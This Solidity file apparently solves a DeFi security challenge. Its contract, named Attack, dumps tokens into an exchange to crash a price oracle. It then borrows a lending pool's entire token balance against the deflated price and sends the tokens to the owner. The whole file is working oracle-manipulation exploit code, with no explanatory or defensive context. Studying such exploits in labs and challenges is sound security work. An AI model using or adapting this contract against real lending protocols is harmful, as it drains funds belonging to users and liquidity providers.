// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";
import "hardhat/console.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IEx {
    // function ethToTokenTransferInput(uint256 min_tokens, uint256 deadline, address recipient) external payable;
    // function tokenToEthTransferInput(uint256 tokens_sold ,uint256 min_eth,uint256 deadline ,address recipient) external;
    //function addLiquidity(uint256)

    
    //function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external  returns (uint[] memory amounts);
}

interface IPool {
    function borrow(uint256 Borrowamount) external;
}


contract Attack {

    address owner;
    ERC20 token;
    address exchange;
    address pool;
    address weth;

    constructor(address _token, address _exchange, address _pool, address _weth) payable {
        owner = msg.sender;
        token = ERC20(_token);
        exchange = _exchange;
        pool = _pool;
        weth = _weth;
        //attack();
    }

    function attack() public {
        //IEx(exchange).ethToTokenTransferInput(0, block.timestamp, msg.sender);
        token.approve(exchange, token.balanceOf(address(this)));

        address[] memory token_path = new address[](2);
        token_path[0] = address(token);
        token_path[1] = weth;
        IEx(exchange).swapExactTokensForTokens(token.balanceOf(address(this)), 1,token_path, address(this), block.timestamp);

        uint256 cur_balance = address(this).balance;
        IWETH(weth).deposit{value: cur_balance}();
        ERC20(weth).approve(pool, ERC20(weth).balanceOf(address(this)));
        IPool(pool).borrow(token.balanceOf(pool));
        token.transfer(owner, token.balanceOf(address(this)));
    }

    receive() external payable {}
}